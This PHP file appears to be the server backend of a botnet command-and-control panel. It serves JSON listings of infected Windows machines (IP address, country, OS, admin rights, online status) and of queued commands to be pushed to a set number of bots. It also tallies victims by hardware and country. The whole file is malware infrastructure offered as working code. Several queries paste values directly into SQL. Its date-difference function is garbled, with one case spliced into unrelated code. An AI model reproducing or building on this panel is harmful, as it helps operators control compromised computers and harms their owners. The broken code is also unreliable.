<?php
include("config.php");
function datediff($interval, $datefrom, $dateto, $using_timestamps = false)
	{
		
		if (!$using_timestamps) {
			$datefrom = strtotime($datefrom, 0);
			$dateto = strtotime($dateto, 0);
		}
		$difference = $dateto - $datefrom; // Difference in seconds

		switch($interval) {
			case 'yyyy': // Number of full years
			$years_difference = floor($difference / 31536000);
			if (mktime(date("H", $datefrom),
								  date("i", $datefrom),
								  date("s", $datefrom),
								  date("n", $datefrom),
								  date("j", $datefrom),
								  date("Y", $datefrom)+$years_difference) > $dateto) {

			$years_difference--;
			}
			if (mktime(date("H", $dateto),
								  date("i", $dateto),
								  date("s", $dateto),
								  date("n", $dateto),
								  date("j", $dateto),
								  date("Y", $dateto)-($years_difference+1)) > $datefrom) {

			$years_difference++;
			}
			$datediff = $years_difference;
			break;

			case "q": // Number of full quarters
			$quarters_difference = floor($difference / 8035200);
			while (mktime(date("H", $datefrom),
									   date("i", $datefrom),
									   date("s", $datefrom),
									   date("n", $datefrom)+($quarters_difference*3),
									   date("j", $dateto),
									   date("Y", $datefrom)) < $dateto) {

			$months_difference++;
			}
			$quarters_difference--;
			$datediff = $quarters_difference;
			break;

			case "m": // Number of full months
			$months_difference = floor($difference / 2678400);
			while (mktime(date("H", $datefrom),
									   date("i", $datefrom),
									   date("s", $datefrom),
									   date("n", $datefrom)+($months_difference),
									   date("j", $dateto), date("Y", $datefrom)))
							{ // Sunday
			$days_remainder--;
			}
			if ($odd_days > 6) { // Saturday
			$days_remainder--;
			}
			$datediff = ($weeks_difference * 5) + $days_remainder;
			break;

			case "ww": // Number of full weeks
			$datediff = floor($difference / 604800);
			break;

			case "h": // Number of full hours
			$datediff = floor($difference / 3600);
			break;

			case "n": // Number of full minutes
			$datediff = floor($difference / 60);
			break;

			default: // Number of full seconds (default)
			$datediff = $difference;
			break;
		}

		return $datediff;
	}
		function createActionMenu($id, $status){
		if($status == '2'){
			$button = '<a href="tasks.php?task=&id='.$id.'&a=reactivate">Reactivate</a>';
		}
		else{
			$button = '<a href="tasks.php?task=&id='.$id.'&a=supspend">Suspend</a>';
		}
		$atts = array(
				'width'       => 800,
				'height'      => 600,
				'scrollbars'  => 'yes',
				'status'      => 'yes',
				'resizable'   => 'yes',
				'screenx'     => 0,
				'screeny'     => 0,
				'window_name' => '_blank'
		);

		return '
			<div class="btn-group">
				<button type="button" class="btn btn-xs dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions <span class="caret"></span></button>
				<ul class="dropdown-menu dropdown-menu-right">
					<!-- <li>' . 'edit/?id=' . $id .'Edit' . '</li> -->
					<li>'.$button.'</li>
					<li><a href="tasks.php?task=&id='.$id.'&a=remove">Remove</a></li>
				</ul>
			</div>
		';
	}
	if(isset($_GET["bot"])){
		$names = '{"BD": "Bangladesh", "BE": "Belgium", "BF": "Burkina Faso", "BG": "Bulgaria", "BA": "Bosnia and Herzegovina", "BB": "Barbados", "WF": "Wallis and Futuna", "BL": "Saint Barthelemy", "BM": "Bermuda", "BN": "Brunei", "BO": "Bolivia", "BH": "Bahrain", "BI": "Burundi", "BJ": "Benin", "BT": "Bhutan", "JM": "Jamaica", "BV": "Bouvet Island", "BW": "Botswana", "WS": "Samoa", "BQ": "Bonaire, Saint Eustatius and Saba ", "BR": "Brazil", "BS": "Bahamas", "JE": "Jersey", "BY": "Belarus", "BZ": "Belize", "RU": "Russia", "RW": "Rwanda", "RS": "Serbia", "TL": "East Timor", "RE": "Reunion", "TM": "Turkmenistan", "TJ": "Tajikistan", "RO": "Romania", "TK": "Tokelau", "GW": "Guinea-Bissau", "GU": "Guam", "GT": "Guatemala", "GS": "South Georgia and the South Sandwich Islands", "GR": "Greece", "GQ": "Equatorial Guinea", "GP": "Guadeloupe", "JP": "Japan", "GY": "Guyana", "GG": "Guernsey", "GF": "French Guiana", "GE": "Georgia", "GD": "Grenada", "GB": "United Kingdom", "GA": "Gabon", "SV": "El Salvador", "GN": "Guinea", "GM": "Gambia", "GL": "Greenland", "GI": "Gibraltar", "GH": "Ghana", "OM": "Oman", "TN": "Tunisia", "JO": "Jordan", "HR": "Croatia", "HT": "Haiti", "HU": "Hungary", "HK": "Hong Kong", "HN": "Honduras", "HM": "Heard Island and McDonald Islands", "VE": "Venezuela", "PR": "Puerto Rico", "PS": "Palestinian Territory", "PW": "Palau", "PT": "Portugal", "SJ": "Svalbard and Jan Mayen", "PY": "Paraguay", "IQ": "Iraq", "PA": "Panama", "PF": "French Polynesia", "PG": "Papua New Guinea", "PE": "Peru", "PK": "Pakistan", "PH": "Philippines", "PN": "Pitcairn", "PL": "Poland", "PM": "Saint Pierre and Miquelon", "ZM": "Zambia", "EH": "Western Sahara", "EE": "Estonia", "EG": "Egypt", "ZA": "South Africa", "EC": "Ecuador", "IT": "Italy", "VN": "Vietnam", "SB": "Solomon Islands", "ET": "Ethiopia", "SO": "Somalia", "ZW": "Zimbabwe", "SA": "Saudi Arabia", "ES": "Spain", "ER": "Eritrea", "ME": "Montenegro", "MD": "Moldova", "MG": "Madagascar", "MF": "Saint Martin", "MA": "Morocco", "MC": "Monaco", "UZ": "Uzbekistan", "MM": "Myanmar", "ML": "Mali", "MO": "Macao", "MN": "Mongolia", "MH": "Marshall Islands", "MK": "Macedonia", "MU": "Mauritius", "MT": "Malta", "MW": "Malawi", "MV": "Maldives", "MQ": "Martinique", "MP": "Northern Mariana Islands", "MS": "Montserrat", "MR": "Mauritania", "IM": "Isle of Man", "UG": "Uganda", "TZ": "Tanzania", "MY": "Malaysia", "MX": "Mexico", "IL": "Israel", "FR": "France", "IO": "British Indian Ocean Territory", "SH": "Saint Helena", "FI": "Finland", "FJ": "Fiji", "FK": "Falkland Islands", "FM": "Micronesia", "FO": "Faroe Islands", "NI": "Nicaragua", "NL": "Netherlands", "NO": "Norway", "NA": "Namibia", "VU": "Vanuatu", "NC": "New Caledonia", "NE": "Niger", "NF": "Norfolk Island", "NG": "Nigeria", "NZ": "New Zealand", "NP": "Nepal", "NR": "Nauru", "NU": "Niue", "CK": "Cook Islands", "XK": "Kosovo", "CI": "Ivory Coast", "CH": "Switzerland", "CO": "Colombia", "CN": "China", "CM": "Cameroon", "CL": "Chile", "CC": "Cocos Islands", "CA": "Canada", "CG": "Republic of the Congo", "CF": "Central African Republic", "CD": "Democratic Republic of the Congo", "CZ": "Czech Republic", "CY": "Cyprus", "CX": "Christmas Island", "CR": "Costa Rica", "CW": "Curacao", "CV": "Cape Verde", "CU": "Cuba", "SZ": "Swaziland", "SY": "Syria", "SX": "Sint Maarten", "KG": "Kyrgyzstan", "KE": "Kenya", "SS": "South Sudan", "SR": "Suriname", "KI": "Kiribati", "KH": "Cambodia", "KN": "Saint Kitts and Nevis", "KM": "Comoros", "ST": "Sao Tome and Principe", "SK": "Slovakia", "KR": "South Korea", "SI": "Slovenia", "KP": "North Korea", "KW": "Kuwait", "SN": "Senegal", "SM": "San Marino", "SL": "Sierra Leone", "SC": "Seychelles", "KZ": "Kazakhstan", "KY": "Cayman Islands", "SG": "Singapore", "SE": "Sweden", "SD": "Sudan", "DO": "Dominican Republic", "DM": "Dominica", "DJ": "Djibouti", "DK": "Denmark", "VG": "British Virgin Islands", "DE": "Germany", "YE": "Yemen", "DZ": "Algeria", "US": "United States", "UY": "Uruguay", "YT": "Mayotte", "UM": "United States Minor Outlying Islands", "LB": "Lebanon", "LC": "Saint Lucia", "LA": "Laos", "TV": "Tuvalu", "TW": "Taiwan", "TT": "Trinidad and Tobago", "TR": "Turkey", "LK": "Sri Lanka", "LI": "Liechtenstein", "LV": "Latvia", "TO": "Tonga", "LT": "Lithuania", "LU": "Luxembourg", "LR": "Liberia", "LS": "Lesotho", "TH": "Thailand", "TF": "French Southern Territories", "TG": "Togo", "TD": "Chad", "TC": "Turks and Caicos Islands", "LY": "Libya", "VA": "Vatican", "VC": "Saint Vincent and the Grenadines", "AE": "United Arab Emirates", "AD": "Andorra", "AG": "Antigua and Barbuda", "AF": "Afghanistan", "AI": "Anguilla", "VI": "U.S. Virgin Islands", "IS": "Iceland", "IR": "Iran", "AM": "Armenia", "AL": "Albania", "AO": "Angola", "AQ": "Antarctica", "AS": "American Samoa", "AR": "Argentina", "AU": "Australia", "AT": "Austria", "AW": "Aruba", "IN": "India", "AX": "Aland Islands", "AZ": "Azerbaijan", "IE": "Ireland", "ID": "Indonesia", "UA": "Ukraine", "QA": "Qatar", "MZ": "Mozambique"}';
		$names = json_decode($names, true);
		
		$bot_array = array();
		
		$osList = array(
			'10.0' => 'Windows 10',
			'6.3' => 'Windows 8.1',
			'6.2' => 'Windows 8',
			'6.1' => 'Windows 7',
			'6.0' => 'Windows Vista',
			'5.2' => 'Windows Server 2003',
			'5.1' => 'Windows XP',
			'5.0' => 'Windows 2000'
		);
			$bots = array();
		if($stmt = $connection->prepare("SELECT * FROM bots WHERE bot_lastseen < date_sub(NOW(), interval 10 minute);")){
		$stmt->execute();		
		$result = $stmt->get_result();
		if ($result->num_rows > 0) {
	    while($row = $result->fetch_assoc()) {
	
			$bot_location_name = preg_replace('/\s+/', '', $row["bot_location"]);
			
				$status = "<font color='red'><b>Offline</b></font>"; 
				$location = "";
				$value = "";
			if($row["bot_location"] == NULL){
				$value = "Unknown";
				$location = "Unknown";
			}
			else if($row["bot_location"] == "undefined"){
				$value = "Unknown";
				$location = "Unknown";
			}
			else{
				$value = strtolower($row["bot_location"]);
				$location = $names[$bot_location_name];
			}
			$bot_array[] = array(
				'id' => $row["id"],
				'machine_id' => $row["bot_uuid"],
				'ipv4' => $row["bot_ipv4"],
				'location' => '<img src="assets/images/flags/'. $value .'.png"> ' . $location,
				'os' => @$osList[$row["bot_os"]],
				'version' => $row["bot_version"],
				'status' => $status,
				'isAdmin' => $row["bot_admin"],
				'last_seen' => $row["bot_lastseen"]
			);
		
		die(json_encode($bot_array));
		}
		}
		}
				if($stmt = $connection->prepare("SELECT * FROM bots WHERE bot_lastseen >= date_sub(NOW(), interval 10 minute);")){
		$stmt->execute();		
		$result = $stmt->get_result();
		if ($result->num_rows > 0) {
	    while($row = $result->fetch_assoc()) {
	
			$bot_location_name = preg_replace('/\s+/', '', $row["bot_location"]);

				$status = "<font color='green'><b>Online</b></font>"; 
			if($row["bot_location"] == NULL){
				$value = "Unknown";
				$location = "Unknown";
			}
			else if($row["bot_location"] == "undefined"){
				$value = "Unknown";
				$location = "Unknown";
			}
			else{
				$value = strtolower($row["bot_location"]);
				$location = $names[$bot_location_name];
			}
			$bot_array[] = array(
				'id' => $row["id"],
				'machine_id' => $row["bot_uuid"],
				'ipv4' => $row["bot_ipv4"],
				'location' => '<img src="assets/images/flags/'. $value .'.png"> ' . $location,
				'os' => @$osList[$row["bot_os"]],
				'version' => $row["bot_version"],
				'status' => $status,
				'isAdmin' => $row["bot_admin"],
				'last_seen' => $row["bot_lastseen"]
			);
		
		die(json_encode($bot_array));
		}
		}
		}
		
	}
	
	
	elseif(isset($_GET["task"])){
		if($stmt = $connection->prepare("SELECT * FROM tasks")){
		$stmt->execute();
		$result = $stmt->get_result();
		if($result->num_rows > 0){
		$tasks = array();
		
		 while($row = $result->fetch_assoc()){
			if($row["status"] == '0'){
				$status = 'Pending';
			}elseif($row["status"] == '1'){
				$status = 'Completed';
			}elseif($row["status"] == '2'){
				$status = 'Supspended';
			}else{
				$status = 'Unknown';
			}
		
		
			$tasks[] = array(
				'task_id' => $row["id"],
				'task_command' => $row["cmd"],
				'task_executed' => $row["executed"],
				'task_failed' => $row["failed"],
				'task_total'=> $row["maxbots"],
				'task_added' => $row["time_added"],
				'task_status' => $row["status"],
				'task_actions' => createActionMenu($row["id"], $row["status"])
			);
		}
		die(json_encode($tasks));
		
	}
	}
	}
		elseif(isset($_GET['cpu'])){
		if($stmt = $connection->prepare("SELECT * FROM bots")){
			$stmt->execute();
			$bnumms = $stmt->get_result();
			$bnum = $bnumms->num_rows;
			
		if($stmt = $connection->prepare("SELECT DISTINCT bot_proc FROM bots")){
			$stmt->execute();
		$result = $stmt->get_result();
		
		if($result->num_rows > 0){
			
		$cpu_list = array();
		$country_result = array();
			while($value = $result->fetch_assoc()){
				$cpu_list[] = $value["bot_proc"];
			}

			foreach($cpu_list as $key => $value){
				if($stmt = $connection->prepare("SELECT * FROM bots WHERE bot_proc='$value'")){
					$stmt->execute();
				$nummss =	$stmt->get_result();
				$num = $nummss->num_rows;
				
				$bot_location_name = preg_replace('/\s+/', '', $value);
				$country_result[] = array(
					'cpu' => $value,
					'num' => $num,
					'per' => round(($num / $bnum) * 100) . '% (' .$num . '/' . $bnum .')'
				);
				
			}
			}
			die( json_encode($country_result) );
		}
		}
		}
		}

		
		
		
			elseif(isset($_GET['countries'])){
		if($stmt = $connection->prepare("SELECT * FROM bots")){
			$stmt->execute();
			$bnumms = $stmt->get_result();
			$bnum = $bnumms->num_rows;
			
		if($stmt = $connection->prepare("SELECT DISTINCT bot_location FROM bots")){
			$stmt->execute();
			$result = $stmt->get_result();
		$names = '{"BD": "Bangladesh", "BE": "Belgium", "BF": "Burkina Faso", "BG": "Bulgaria", "BA": "Bosnia and Herzegovina", "BB": "Barbados", "WF": "Wallis and Futuna", "BL": "Saint Barthelemy", "BM": "Bermuda", "BN": "Brunei", "BO": "Bolivia", "BH": "Bahrain", "BI": "Burundi", "BJ": "Benin", "BT": "Bhutan", "JM": "Jamaica", "BV": "Bouvet Island", "BW": "Botswana", "WS": "Samoa", "BQ": "Bonaire, Saint Eustatius and Saba ", "BR": "Brazil", "BS": "Bahamas", "JE": "Jersey", "BY": "Belarus", "BZ": "Belize", "RU": "Russia", "RW": "Rwanda", "RS": "Serbia", "TL": "East Timor", "RE": "Reunion", "TM": "Turkmenistan", "TJ": "Tajikistan", "RO": "Romania", "TK": "Tokelau", "GW": "Guinea-Bissau", "GU": "Guam", "GT": "Guatemala", "GS": "South Georgia and the South Sandwich Islands", "GR": "Greece", "GQ": "Equatorial Guinea", "GP": "Guadeloupe", "JP": "Japan", "GY": "Guyana", "GG": "Guernsey", "GF": "French Guiana", "GE": "Georgia", "GD": "Grenada", "GB": "United Kingdom", "GA": "Gabon", "SV": "El Salvador", "GN": "Guinea", "GM": "Gambia", "GL": "Greenland", "GI": "Gibraltar", "GH": "Ghana", "OM": "Oman", "TN": "Tunisia", "JO": "Jordan", "HR": "Croatia", "HT": "Haiti", "HU": "Hungary", "HK": "Hong Kong", "HN": "Honduras", "HM": "Heard Island and McDonald Islands", "VE": "Venezuela", "PR": "Puerto Rico", "PS": "Palestinian Territory", "PW": "Palau", "PT": "Portugal", "SJ": "Svalbard and Jan Mayen", "PY": "Paraguay", "IQ": "Iraq", "PA": "Panama", "PF": "French Polynesia", "PG": "Papua New Guinea", "PE": "Peru", "PK": "Pakistan", "PH": "Philippines", "PN": "Pitcairn", "PL": "Poland", "PM": "Saint Pierre and Miquelon", "ZM": "Zambia", "EH": "Western Sahara", "EE": "Estonia", "EG": "Egypt", "ZA": "South Africa", "EC": "Ecuador", "IT": "Italy", "VN": "Vietnam", "SB": "Solomon Islands", "ET": "Ethiopia", "SO": "Somalia", "ZW": "Zimbabwe", "SA": "Saudi Arabia", "ES": "Spain", "ER": "Eritrea", "ME": "Montenegro", "MD": "Moldova", "MG": "Madagascar", "MF": "Saint Martin", "MA": "Morocco", "MC": "Monaco", "UZ": "Uzbekistan", "MM": "Myanmar", "ML": "Mali", "MO": "Macao", "MN": "Mongolia", "MH": "Marshall Islands", "MK": "Macedonia", "MU": "Mauritius", "MT": "Malta", "MW": "Malawi", "MV": "Maldives", "MQ": "Martinique", "MP": "Northern Mariana Islands", "MS": "Montserrat", "MR": "Mauritania", "IM": "Isle of Man", "UG": "Uganda", "TZ": "Tanzania", "MY": "Malaysia", "MX": "Mexico", "IL": "Israel", "FR": "France", "IO": "British Indian Ocean Territory", "SH": "Saint Helena", "FI": "Finland", "FJ": "Fiji", "FK": "Falkland Islands", "FM": "Micronesia", "FO": "Faroe Islands", "NI": "Nicaragua", "NL": "Netherlands", "NO": "Norway", "NA": "Namibia", "VU": "Vanuatu", "NC": "New Caledonia", "NE": "Niger", "NF": "Norfolk Island", "NG": "Nigeria", "NZ": "New Zealand", "NP": "Nepal", "NR": "Nauru", "NU": "Niue", "CK": "Cook Islands", "XK": "Kosovo", "CI": "Ivory Coast", "CH": "Switzerland", "CO": "Colombia", "CN": "China", "CM": "Cameroon", "CL": "Chile", "CC": "Cocos Islands", "CA": "Canada", "CG": "Republic of the Congo", "CF": "Central African Republic", "CD": "Democratic Republic of the Congo", "CZ": "Czech Republic", "CY": "Cyprus", "CX": "Christmas Island", "CR": "Costa Rica", "CW": "Curacao", "CV": "Cape Verde", "CU": "Cuba", "SZ": "Swaziland", "SY": "Syria", "SX": "Sint Maarten", "KG": "Kyrgyzstan", "KE": "Kenya", "SS": "South Sudan", "SR": "Suriname", "KI": "Kiribati", "KH": "Cambodia", "KN": "Saint Kitts and Nevis", "KM": "Comoros", "ST": "Sao Tome and Principe", "SK": "Slovakia", "KR": "South Korea", "SI": "Slovenia", "KP": "North Korea", "KW": "Kuwait", "SN": "Senegal", "SM": "San Marino", "SL": "Sierra Leone", "SC": "Seychelles", "KZ": "Kazakhstan", "KY": "Cayman Islands", "SG": "Singapore", "SE": "Sweden", "SD": "Sudan", "DO": "Dominican Republic", "DM": "Dominica", "DJ": "Djibouti", "DK": "Denmark", "VG": "British Virgin Islands", "DE": "Germany", "YE": "Yemen", "DZ": "Algeria", "US": "United States", "UY": "Uruguay", "YT": "Mayotte", "UM": "United States Minor Outlying Islands", "LB": "Lebanon", "LC": "Saint Lucia", "LA": "Laos", "TV": "Tuvalu", "TW": "Taiwan", "TT": "Trinidad and Tobago", "TR": "Turkey", "LK": "Sri Lanka", "LI": "Liechtenstein", "LV": "Latvia", "TO": "Tonga", "LT": "Lithuania", "LU": "Luxembourg", "LR": "Liberia", "LS": "Lesotho", "TH": "Thailand", "TF": "French Southern Territories", "TG": "Togo", "TD": "Chad", "TC": "Turks and Caicos Islands", "LY": "Libya", "VA": "Vatican", "VC": "Saint Vincent and the Grenadines", "AE": "United Arab Emirates", "AD": "Andorra", "AG": "Antigua and Barbuda", "AF": "Afghanistan", "AI": "Anguilla", "VI": "U.S. Virgin Islands", "IS": "Iceland", "IR": "Iran", "AM": "Armenia", "AL": "Albania", "AO": "Angola", "AQ": "Antarctica", "AS": "American Samoa", "AR": "Argentina", "AU": "Australia", "AT": "Austria", "AW": "Aruba", "IN": "India", "AX": "Aland Islands", "AZ": "Azerbaijan", "IE": "Ireland", "ID": "Indonesia", "UA": "Ukraine", "QA": "Qatar", "MZ": "Mozambique"}';
		$names = json_decode($names, true);
		
		$country_list = array();
		$country_result = array();
		if($result->num_rows > 0){
			while($value = $result->fetch_assoc()){
				$country_list[] = $value["bot_location"];
			}
		
			foreach($country_list as $key => $value){
				if($stmt = $connection->prepare("SELECT * FROM bots WHERE bot_location='$value'")){
				$stmt->execute();
				$nummss =	$stmt->get_result();
				$num = $nummss->num_rows;
				
				$bot_location_name = preg_replace('/\s+/', '', $value);
				$country_result[] = array(
					'country_code' => preg_replace('/\s+/', '', $value),
					'country_name' => '<img src="assets/images/flags/'. strtolower($value).'.png"> ' . $names[$bot_location_name],
					'num' => $num,
					'per' => round(($num / $bnum) * 100) . '% (' .$num . '/' . $bnum .')'
				);
				
			}
			die( json_encode($country_result) );
		}
		}
		}
		}
		}
		
		
			elseif(isset($_GET['storage'])){
		if($stmt = $connection->prepare("SELECT * FROM bots")){
			$stmt->execute();
			$bnumms = $stmt->get_result();
			$bnum = $bnumms->num_rows;
			if($stmt = $connection->prepare("SELECT DISTINCT bot_space FROM bots")){
			$stmt->execute();
			$result = $stmt->get_result();
	
		$cpu_list = array();
		$country_result = array();
		if($result->num_rows > 0){
			while($value = $result->fetch_assoc()){
				$cpu_list[] = $value["bot_space"];
			}

			foreach($cpu_list as $key => $value){
				if($stmt = $connection->prepare("SELECT * FROM bots WHERE bot_space='$value'")){
				$stmt->execute();
				$nummss =	$stmt->get_result();
				$num = $nummss->num_rows;
				
				$bot_location_name = preg_replace('/\s+/', '', $value);
				$country_result[] = array(
					'storage' => $value,
					'num' => $num,
					'per' => round(($num / $bnum) * 100) . '% (' .$num . '/' . $bnum .')'
				);
				
			}
			}
			die( json_encode($country_result) );
	}
	}
	}
	}
	
	
	
		
	elseif(isset($_GET['os'])){
		if($stmt = $connection->prepare("SELECT * FROM bots")){
			$stmt->execute();
			$bnumms = $stmt->get_result();
			$bnum = $bnumms->num_rows;
		if($stmt = $connection->prepare("SELECT DISTINCT bot_os FROM bots")){
			$stmt->execute();
			$result = $stmt->get_result();
	
		$osList = array(
			'10.0' => 'Windows 10',
			'6.3' => 'Windows 8.1',
			'6.2' => 'Windows 8',
			'6.1' => 'Windows 7',
			'6.0' => 'Windows Vista',
			'5.2' => 'Windows Server 2003',
			'5.1' => 'Windows XP',
			'5.0' => 'Windows 2000'
		);
		
		$cpu_list = array();
		$country_result = array();
			while($value = $result->fetch_assoc()){
				$cpu_list[] = $value["bot_os"];
			}

			foreach($cpu_list as $key => $value){
				if($stmt = $connection->prepare("SELECT * FROM bots WHERE bot_os='$value'")){
				$stmt->execute();
				$nummss =	$stmt->get_result();
				$num = $nummss->num_rows;
				$bot_location_name = preg_replace('/\s+/', '', $value);
				$country_result[] = array(
					'os' => @$osList[$value],
					'num' => $num,
					'per' => round(($num / $bnum) * 100) . '% (' .$num . '/' . $bnum .')'
				);
				}
			}
			die( json_encode($country_result) );
	}
	}
	}
	
	elseif(isset($_GET['gpu'])){
		
		if($stmt = $connection->prepare("SELECT * FROM bots")){
			$stmt->execute();
			$bnumms = $stmt->get_result();
			$bnum = $bnumms->num_rows;

		if($stmt = $connection->prepare("SELECT DISTINCT bot_gpu FROM bots")){
			$stmt->execute();
			$result = $stmt->get_result();
		$cpu_list = array();
		$country_result = array();
			while($value = $result->fetch_assoc()){
				$cpu_list[] = $value["bot_gpu"];
			}

			foreach($cpu_list as $key => $value){
				if($stmt = $connection->prepare("SELECT * FROM bots WHERE bot_gpu='$value'")){
				$stmt->execute();
				$nummss =	$stmt->get_result();
				$num = $nummss->num_rows;
				$bot_location_name = preg_replace('/\s+/', '', $value);
				$country_result[] = array(
					'gpu' => $value,
					'num' => $num,
					'per' => round(($num / $bnum) * 100) . '% (' .$num . '/' . $bnum .')'
				);
				
			}
			}
			die( json_encode($country_result) );
	}
	}
	}
	
	elseif(isset($_GET['ram'])){
		
		if($stmt = $connection->prepare("SELECT * FROM bots")){
			$stmt->execute();
			$bnumms = $stmt->get_result();
			$bnum = $bnumms->num_rows;
			if($stmt = $connection->prepare("SELECT DISTINCT bot_ram FROM bots")){
			$stmt->execute();
			$result = $stmt->get_result();
		$cpu_list = array();
		$country_result = array();
			while($value = $result->fetch_assoc()){
				$cpu_list[] = $value["bot_ram"];
			}

			foreach($cpu_list as $key => $value){
				if($stmt = $connection->prepare("SELECT * FROM bots WHERE bot_ram='$value'")){
				$stmt->execute();
				$nummss =	$stmt->get_result();
				$num = $nummss->num_rows;
				$bot_location_name = preg_replace('/\s+/', '', $value);
				$country_result[] = array(
					'ram' => $value,
					'num' => $num,
					'per' => round(($num / $bnum) * 100) . '% (' .$num . '/' . $bnum .')'
				);
				
			}
			}
			die( json_encode($country_result) );
	}
	}
	}
	else{
		die("There is someone visiting who shouldnt!");
	}